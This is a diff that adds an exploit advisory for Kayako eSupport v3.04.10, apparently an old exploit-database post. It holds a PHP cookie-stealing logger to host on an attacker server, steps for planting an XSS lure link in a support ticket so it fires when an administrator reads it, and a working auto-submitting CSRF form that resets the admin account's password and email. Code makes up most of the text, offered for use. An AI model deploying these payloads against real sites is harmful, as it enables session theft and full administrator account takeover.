@@ -1,0 +1,83 @@
+#################################################################################################################
+[+] Exploit Title : kayako (xss/xsrf) Remote Vulnerabilities
+[+] Author : By D3V!L FUCKER
+[+] Script Link : http://www.kayako.com/solutions/esupport/
+[+] Version :  Kayako eSupport v3.04.10
+[+] Tested on : linux ubuntu 9.10
+[+] Code :
+#################################################################################################################
++++++++++++++++++++++++++
+http://server/path/staff/index.php?_m=tickets&_a=manage&s_query=">
+==================================================================
+PoC
+--
+[+] Make 2 files and upload to your host :
+[+]cookie.php  - > Put in this File That Code:
+ <?php
+ $cookie = $_GET['cookie'];
+ $log = fopen("log.txt", "a");
+ fwrite($log, $cookie ."\n");
+ fclose($log);
+ ?>
+[+]log.txt   - > CHMOD it 777 and put in the same directory with cookie.php
+
+[+]Exploit:
+   -------
+1) Register in The SIte
+2)Open New Ticket
+3)We Put in
+  To:admin name
+  Subject: Some Subject
+  Message: http://server/path/staff/index.php?_m=tickets&_a=manage&s_query="> //Cover The Link By Any Thing Use Your Brain
+  The js code Worked When The admin Read The Message
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+2) Xsrf POC
++++++++++++++++++
+
+<form name="staffform" id="staffform" action="http://site.com/path/admin/index.php?_m=core&_a=editstaff&staffid=1" method="POST">
+
+<body onload="document.forms.staffform.submit();">
+<!-- Name -->
+<input type="hidden" name="fullname" id="fullname" value="admin" /><br>
+
+<!-- UserName -->
+<input type="hidden" name="username" id="username" value="admin" /></br>
+
+<!-- password -->
+<input type="hidden" name="password" id="password" value="123123" /></br>
+
+<!-- Re-enter Password -->
+<input type="hidden" name="passwordconfirm" id="passwordconfirm" value="123123" /></br>
+
+<!-- E-mail -->
+<input type="hidden" name="email" id="email" value="w0@live.no" /></br>
+
+<!-- Mobile Phone Number -->
+<input type="hidden" name="mobilenumber" id="mobilenumber" value="" /></br>
+
+
+<!-- Group -->
+<input type="hidden" name="staffgroupid" value="1" /></br>
+
+
+<!-- Assigned Departments -->
+<input type="hidden" name="assigneddepid[]" value="1" /></br>
+
+<input type="hidden" name="submitbutton" class="yellowbuttonbig" value="Update Staff" /> </br>
+
+</table></td></tr></tbody></table>
+
+<input type="hidden" name="_m" value="core"/>
+
+<input type="hidden" name="_a" value="editstaff"/>
+
+<input type="hidden" name="step" value="1"/>
+
+<input type="hidden" name="staffid" value="1"/>
+
+
+</form>
+
+</html>
+
+################################################################################################################
